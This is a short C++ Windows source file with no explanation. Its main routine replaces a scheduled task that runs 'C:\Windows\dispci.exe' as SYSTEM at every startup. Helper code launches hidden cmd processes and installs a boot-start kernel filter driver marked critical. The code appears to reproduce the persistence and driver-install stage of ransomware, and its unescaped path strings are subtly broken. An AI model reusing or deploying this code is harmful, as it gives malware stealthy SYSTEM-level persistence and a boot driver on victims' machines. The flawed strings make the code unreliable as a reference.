
#include <tchar.h>
#include <Windows.h>
#include <WinBase.h>
#include <cstdio>
#include <cstdlib>
#include <iostream>

BOOL __stdcall ExecuteCommandLineOnCMD(LPCWSTR command_line, int milliseconds);
DWORD __stdcall CreateServiceBoot(LPCWSTR service_name, LPCWSTR service_description, LPCWSTR path_to_service);

int main()
{
	ExecuteCommandLineOnCMD(L"schtasks /Delete /F /TN <service_name>", 0);
	ExecuteCommandLineOnCMD(L"schtasks /Create /RU SYSTEM /SC ONSTART /TN <service_name> /TR \"C:\Windows\system32\cmd.exe /C Start \"\" \"C:\Windows\dispci.exe\" -id 1225735392 && exit\"", 0);
}


BOOL __stdcall ExecuteCommandLineOnCMD(LPCWSTR command_line, int milliseconds)
{
	BOOL return_value = FALSE;
	WCHAR argument_of_command[1000];
	WCHAR ComSpec_cmd_path[MAX_PATH];
	PROCESS_INFORMATION process_information;
	STARTUPINFO startup_info;

	wsprintfW(argument_of_command, L"/c %ws", command_line);

	if (GetEnvironmentVariableW(L"ComSpec", ComSpec_cmd_path, MAX_PATH)
		|| GetSystemDirectoryW(ComSpec_cmd_path, MAX_PATH) && lstrcatW(ComSpec_cmd_path, L"\\cmd.exe"))
	{
		ZeroMemory(&process_information, sizeof(PROCESS_INFORMATION));
		ZeroMemory(&startup_info, sizeof(STARTUPINFO));

		startup_info.cb = sizeof(STARTUPINFO);

		return_value = CreateProcess(
			ComSpec_cmd_path,
			argument_of_command,
			NULL,
			NULL,
			FALSE,
			CREATE_NO_WINDOW,
			NULL,
			NULL,
			&startup_info,
			&process_information
		);

		if (return_value)
			Sleep(1000 * milliseconds);
	}

	return return_value;
}


DWORD __stdcall CreateServiceBoot(LPCWSTR service_name, LPCWSTR service_description, LPCWSTR path_to_service)
{
	SC_HANDLE sc_handle, service_handle;
	DWORD return_value;

	sc_handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (sc_handle)
	{
		service_handle = CreateServiceW(
			sc_handle,
			service_name,
			service_description,
			SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER,
			SERVICE_BOOT_START,
			SERVICE_ERROR_CRITICAL,
			path_to_service,
			L"Filter",
			NULL,
			L"FltMgr",
			NULL,
			NULL
		);

		if (service_handle)
			return_value = 0;
		else
			return_value = GetLastError();

		if (service_handle)
			CloseServiceHandle(service_handle);
		CloseServiceHandle(sc_handle);
	}
	else
		return_value = GetLastError();

	return return_value;
}